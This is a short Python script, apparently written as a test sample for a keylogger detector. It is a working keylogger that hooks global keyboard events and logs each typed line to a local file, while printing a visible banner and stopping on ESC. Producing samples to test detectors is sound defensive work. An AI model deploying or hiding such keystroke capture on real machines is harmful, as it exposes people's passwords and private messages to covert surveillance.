# For testing the keylogger detector - Made by Otis Hoymans
# WARNING: This is only for educational purposes to test the detector

import keyboard
import time
import logging
import os
from pathlib import Path
import datetime

# Set up logging to the logs directory
log_dir = Path("logs")
log_dir.mkdir(exist_ok=True)
log_file = log_dir / "keylog.log"

logging.basicConfig(
    filename=str(log_file),
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

print("""
!! DUMMY KEYLOGGER RUNNING !!
This is a harmless test keylogger for educational purposes only.
All keypresses will be logged to logs/keylog.log
Press ESC to exit the keylogger.
""")

# Store typed characters for current sentence
typed_sentence = []

def format_key(key):
    """Convert raw key names into readable format."""
    if len(key) == 1:
        return key
    special_keys = {
        "space": " ",
        "enter": "[ENTER]",
        "backspace": "[BACKSPACE]",
        "tab": "[TAB]",
        "esc": "[ESC]",
        "shift": "[SHIFT]",
        "ctrl": "[CTRL]",
        "alt": "[ALT]",
        "up": "[UP]",
        "down": "[DOWN]",
        "left": "[LEFT]",
        "right": "[RIGHT]"
    }
    return special_keys.get(key, f"[{key.upper()}]")

def on_key_press(event):
    global typed_sentence

    key = event.name
    formatted = format_key(key)
    typed_sentence.append(formatted)

    # If Enter is pressed, log the whole sentence
    if key == "enter":
        clean_output = "".join(typed_sentence).strip()
        logging.info(f"Typed: {clean_output}")
        typed_sentence = []

    # Exit key
    if key == "esc":
        return False

# Hook into keyboard press events
keyboard.on_press(on_key_press)

try:
    keyboard.wait("esc")
    # Flush last line if anything left
    if typed_sentence:
        logging.info(f"Typed: {''.join(typed_sentence).strip()}")
except KeyboardInterrupt:
    pass
finally:
    print("\nDummy keylogger stopped. Check logs/keylog.log for captured keys.")
    logging.info("Keylogger stopped.")
